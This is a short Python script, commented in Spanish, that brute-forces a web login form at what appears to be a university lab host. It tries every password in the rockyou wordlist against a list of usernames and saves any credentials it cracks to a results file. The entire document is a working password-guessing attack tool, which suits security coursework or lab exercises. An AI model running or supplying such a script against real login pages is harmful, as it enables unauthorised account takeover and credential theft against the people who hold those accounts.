import requests

# URL del formulario de login
url = 'https://pium-pium.dsa.linti.unlp.edu.ar/login'

# Rutas de archivos
ruta_usuarios = 'users.txt'
ruta_diccionario = 'rockyou.txt'
ruta_resultados = 'resultados.txt'

# Abrimos archivo de resultados
with open(ruta_resultados, 'w', encoding='utf-8') as salida:
    # Leer usuarios
    with open(ruta_usuarios, 'r', encoding='utf-8') as f:
        usuarios = [line.strip() for line in f if line.strip()]

    for usuario in usuarios:
        print(f"[*] Probando usuario: {usuario}")
        encontrado = False

        with open(ruta_diccionario, 'r', encoding='latin-1', errors='ignore') as dicc:
            for i, password in enumerate(dicc):
                password = password.strip()

                data = {
                    'username': usuario,
                    'password': password
                }

                try:
                    response = requests.post(url, data=data)

                    if "incorrectos" not in response.text:
                        print(f"[+] Usuario: {usuario} | Contraseña encontrada: {password}")
                        salida.write(f"{usuario}:{password}\n")
                        encontrado = True
                        break

                except requests.RequestException as e:
                    print(f"[-] Error con usuario {usuario}: {e}")
                    salida.write(f"{usuario}: Error - {e}\n")
                    encontrado = True  # Para no repetir mensaje al final
                    break

                if i % 1000 == 0:
                    print(f"  - {i} contraseñas probadas...")

        if not encontrado:
            print(f"[-] No se encontró contraseña para {usuario}")
            salida.write(f"{usuario}: Contraseña no encontrada\n")
